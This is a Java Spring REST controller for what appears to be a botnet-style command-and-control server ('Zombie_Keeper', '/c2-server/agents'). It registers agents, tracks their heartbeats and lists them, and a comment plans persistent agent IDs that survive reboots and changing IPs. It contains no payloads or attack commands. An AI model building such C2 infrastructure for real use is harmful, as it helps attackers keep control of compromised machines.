package com.manager.Zombie_Keeper.controller;

import com.manager.Zombie_Keeper.exception.DuplicateAgentException;
import com.manager.Zombie_Keeper.model.Agent;
import com.manager.Zombie_Keeper.repository.AgentRepository;
import org.springframework.web.bind.annotation.*;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

@RestController
@RequestMapping("/c2-server/agents")

public class AgentController {

    private final AgentRepository agentRepository;

    public AgentController(AgentRepository agentRepository) {
        this.agentRepository = agentRepository;
    }

    @PostMapping("/register")
    public Agent registerAgent(@RequestBody Agent newAgent){
        /*
            Criar ---> >>  >> 

            Criar novo fluxo futuramente 
            Agent registra
            Backend retorna agentId
            Agent salva localmente (arquivo / registry)
            
            para os proximos registros usarem o memso id
            resolve:
            IP dinâmico
            reinstalação
            reboot
            NAT
            
        */

        if(! ( agentRepository.findByIp(newAgent.getIp()) != null ) ){

             return agentRepository.save(newAgent);


        }

        throw new DuplicateAgentException("Agent duplicate.");
       
        
    }
    @PutMapping("/{id}/ping")
    public Agent pingAgent(@PathVariable UUID id){

        Agent agent = agentRepository.findById(id).orElse(null);

        if(agent != null){
            agent.setLastSeen(LocalDateTime.now());
            return agentRepository.save(agent);
        }
        return null;
    }

    @GetMapping
    public List<Agent> getAllAgents(){

        List<Agent> agents = new ArrayList<>();

        agents = agentRepository.findAll();

        return agents;
    }

    @GetMapping("/{id}")

    public Agent getAgentDetails(@PathVariable UUID id){

        Agent agent = agentRepository.findById(id).orElse(null);

        if(agent != null){

            return agent;
        }

        return null;
    }


}
